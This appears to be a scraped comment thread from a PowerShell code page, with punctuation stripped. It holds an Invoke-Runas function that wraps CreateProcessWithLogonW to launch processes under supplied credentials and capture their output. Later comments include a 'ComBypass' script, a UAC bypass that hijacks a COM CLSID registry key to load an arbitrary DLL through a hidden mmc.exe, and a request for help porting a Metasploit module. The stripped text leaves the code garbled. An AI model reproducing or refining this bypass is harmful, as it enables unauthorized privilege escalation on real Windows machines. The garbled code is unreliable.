 ensp enspI try to create a pipe to output the commands stdout powershell function InvokeRunas SYNOPSIS Overview Functionally equivalent to Windows runasexe using Advapi CreateProcessWithLogonW also used by runas under the hood Parameters User Specifiy username Password Specify password Domain Specify domain Defaults to localhost if not specified LogonType dwLogonFlags x LOGONWITHPROFILE Log on then load the user profile in the HKEYUSERS registry key The function returns after the profile is loaded x LOGONNETCREDENTIALSONLY netonly Log on but use the specified credentials on the network only The new process uses the same token as the caller but the system creates a new logon session within LSA and the process uses the specified credentials as the default credentials Binary Full path of the module to be executed Args Arguments to pass to the module eg c calcexe Defaults to null if not specified DESCRIPTION Author Ruben Boonen FuzzySec License BSD Clause Required Dependencies None Optional Dependencies None EXAMPLE Start cmd with a local account C PS InvokeRunas User SomeAccount Password SomePass Binary C Windows System cmdexe LogonType x EXAMPLE Start cmd with remote credentials Equivalent to netonly in runas C PS InvokeRunas User SomeAccount Password SomePass Domain SomeDomain Binary C Windows System cmdexe LogonType x param ParameterMandatory True string User ParameterMandatory True string Password ParameterMandatory False string Domain ParameterMandatory True string Binary ParameterMandatory False string Argsnull ParameterMandatory True int ValidateSet string LogonType AddType TypeDefinition using System using SystemDiagnostics using SystemRuntimeInteropServices using SystemSecurityPrincipal using MicrosoftWin SafeHandles StructLayoutLayoutKindSequential public struct PROCESSINFORMATION public IntPtr hProcess public IntPtr hThread public uint dwProcessId public uint dwThreadId StructLayoutLayoutKindSequential CharSet CharSetUnicode public struct STARTUPINFO public uint cb public string lpReserved public string lpDesktop public string lpTitle public uint dwX public uint dwY public uint dwXSize public uint dwYSize public uint dwXCountChars public uint dwYCountChars public uint dwFillAttribute public uint dwFlags public short wShowWindow public short cbReserved public IntPtr lpReserved public IntPtr hStdInput public IntPtr hStdOutput public IntPtr hStdError StructLayoutLayoutKindSequential public struct SECURITYATTRIBUTES public int nLength public IntPtr lpSecurityDescriptor MarshalAsUnmanagedTypeBool public bool bInheritHandle public enum StdHandle Stdin Stdout Stderr public static class Advapi DllImportadvapi dll SetLastErrortrue CharSetCharSetUnicode public static extern bool CreateProcessWithLogonW String userName String domain String password int logonFlags String applicationName String commandLine int creationFlags int environment String currentDirectory ref STARTUPINFO startupInfo out PROCESSINFORMATION processInformation public static class Kernel DllImportkernel dll public static extern uint GetLastError DllImportkernel dll CharSetCharSetAuto SetLastErrortrue public static extern bool CreatePipe ref IntPtr hReadPipe ref IntPtr hWritePipe IntPtr lpPipeAttributes int nSize DllImportkernel dll CharSetCharSetAuto SetLastErrortrue public static extern bool SetHandleInformation IntPtr hObject int dwMask int dwFlags DllImportkernel dll CharSetCharSetAuto SetLastErrortrue public static extern bool CloseHandle IntPtr hObject DllImportkernel dll CharSetCharSetAuto SetLastErrortrue public static extern IntPtr GetStdHandle StdHandle std DllImportkernel dll CharSetCharSetAuto SetLastErrortrue public static extern bool ReadFile IntPtr hFile Out byte lpBuffer uint nNumberOfBytesToRead out uint lpNumberOfBytesRead IntPtr lpOverlapped DllImportkernel dll CharSetCharSetAuto SetLastErrortrue public static extern bool WriteFile IntPtr hFile In byte lpBuffer int nNumberOfBytesToRead out uint lpNumberOfBytesRead IntPtr lpOverlapped prepare pipeline sa NewObject SECURITYATTRIBUTES sanLength SystemRuntimeInteropServicesMarshal SizeOfsa salpSecurityDescriptor sabInheritHandle True IntPtr attr SystemRuntimeInteropServicesMarshal AllocHGlobal SystemRuntimeInteropServicesMarshal SizeOfsa SystemRuntimeInteropServicesMarshal StructureToPtrsa attr True IntPtr hWrite IntPtr hRead CallResult Kernel CreatePipe ref hRead ref hWrite attr ifCallResult CallResult Kernel SetHandleInformationhRead x ifCallResult StartupInfo Struct StartupInfo NewObject STARTUPINFO StartupInfodwFlags x StartupInfowShowWindow x StartupInfocb SystemRuntimeInteropServicesMarshal SizeOfStartupInfo StartupInfohStdOutput hWrite StartupInfohStdError hWrite ProcessInfo Struct ProcessInfo NewObject PROCESSINFORMATION CreateProcessWithLogonW lpCurrentDirectory GetCurrentPath GetItem Path VerboseFullName echo n Calling Advapi CreateProcessWithLogonW CallResult Advapi CreateProcessWithLogonW User Domain Password LogonType Binary Args x null GetCurrentPath ref StartupInfo ref ProcessInfo if CallResult echo n Mmm something went wrong GetLastError returned echo NewObject SystemComponentModelWin Exception int Kernel GetLastErrorMessagen else echo n Success process details GetProcess Id ProcessInfodwProcessId Kernel CloseHandleProcessInfohProcess Kernel CloseHandleProcessInfohThread Read from pipe chBuf NewObject Byte uint dwRead uint dwWritten SafeHandles hParentStdOut Kernel GetStdHandle for bSuccess Kernel ReadFilehRead chBuf ref dwRead systemIntptr Zero ifbSuccess or dwRead eq break bSuccess Kernel WriteFilehParentStdOut chBuf dwRead ref dwWritten systemIntptr Zero ifbSuccess or dwRead lt break It appears that Args will only work when passed with at least one leading white space Only tested on Win x with mmcexe binary Hello I it possible you can implement this system call SMB into powershell Previous File Version Enumeration I found this code that is working The expected result would look like that GMT GMT GMT GMT GMT GMT GMT I was unable to transform type definitions to PowerShell Thanks to take a look at this JeanMarc Is it possible to not open new window counterpart of NoNewWindow switch in startprocess Theres no such information in argument list Hi there I was wondering if you could give me any tips on making a powershell script for this UAC bypass Ive tried to copy the metasploit module but Ive got nowhere function ComBypass param ParameterMandatory False String dllFile rootKeyHKCU SOFTWARE Classes CLSID A FF E F C B F E inprockey rootKey InProcServer shellkey rootKey ShellFolder NewItem rootKey Force NewItem inprockey NewItem shellkey NewItemProperty Path inprockey Name Default Value dllFile NewItemProperty Path inprockey Name ThreadingModel Value Apartment NewItemProperty Path inprockey Name LoadWithoutCOM Value NewItemProperty Path shellkey Name HideOnDesktop Value NewItemProperty Path shellkey Name Attributes PropertyType DWord Value xf d StartProcess File cmdexe ArgumentList c mmcexe CompMgmtmsc WindowStyle Hidden StartSleep Seconds RemoveItem Path rootKey Force Recurse ComBypass dllFile C cmddll I cant seem to do anything to get them to work Whenever I try to execute a script my powershell window just jumps to a new line no error nothing It does nothing I am running powershell as admin and I have the right execution policy but none of the scripts seem to do anything for me